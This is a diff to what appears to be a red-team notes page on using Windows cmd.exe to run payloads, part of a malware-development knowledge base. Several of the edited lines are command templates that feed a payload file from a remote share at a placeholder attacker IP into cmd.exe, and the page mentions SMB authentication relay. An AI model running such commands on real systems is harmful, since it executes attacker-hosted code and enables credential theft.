@@ -17,7 +17,7 @@ C:\Windows\System32\cmd.exe
 C:\Windows\SysWOW64\cmd.exe
 ```
 
-## 02 - Execute Implants
+## 02 - Execute Payloads
 
 > [!INFO] [Character Maximum Limit](https://learn.microsoft.com/en-us/troubleshoot/windows-client/shell-experience/command-line-string-limitation)
 > The maximum length of characters in a string is 8192 characters when executing through a command prompt.
@@ -29,11 +29,11 @@ C:\> cmd.exe /c <commands>
 ```
 
 ```
-C:\> cmd.exe - < [<drive_letter>:\]path\to\implant.txt
+C:\> cmd.exe - < [<drive_letter>:\]path\to\payload.txt
 
-C:\> cmd.exe /c - \\<attacker_IP>\path\to\implant.txt
+C:\> cmd.exe /c - \\<attacker_IP>\path\to\payload.txt
 
-C:\> cmd.exe /c < \\<attacker_IP>\path\to\implant.txt
+C:\> cmd.exe /c < \\<attacker_IP>\path\to\payload.txt
 ```
 
 Execute command to perform SMB authentication relay.
@@ -71,7 +71,7 @@ find.exe, findstr.exe, [x]copy, move, replace.exe, del, rename and many more!
 
 ### Backlinks
 
-- [[Batch|Malware Development: Batch Obfuscation Techniques]]
+- [[03 - Malware Development/Global Helpers/Evasion/Obfuscation Techniques/Windows/Batch|Malware Development: Batch Obfuscation Techniques]]
 
 ### LOLBAS
 
